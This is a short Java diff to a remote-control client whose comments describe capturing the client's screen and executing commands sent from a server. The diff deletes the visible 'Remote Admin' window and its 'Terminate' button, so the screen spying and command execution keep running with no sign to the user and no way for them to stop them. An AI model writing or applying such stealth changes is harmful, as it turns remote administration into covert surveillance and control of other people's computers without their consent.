@@ -64,7 +64,6 @@ public class ClientInitiator{
                 robot = new Robot(gDev);
 
                 //draw client gui
-                drawGUI();
                 //ScreenSpyer sends screenshots of the client screen
                 new ScreenSpyer(client,robot,rectangle);
                 //ServerDelegate recieves server commands and execute them
@@ -81,20 +80,5 @@ public class ClientInitiator{
         }
     }
 
-    private void drawGUI() {
-        JFrame frame = new JFrame("Remote Admin");
-        JButton button= new JButton("Terminate");
-        
-        frame.setBounds(100,100,150,150);
-        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-        frame.add(button);
-        button.addActionListener( new ActionListener() {
 
-            public void actionPerformed(ActionEvent e) {
-                System.exit(0);
-            }
-        }
-      );
-      frame.setVisible(true);
-    }
 }
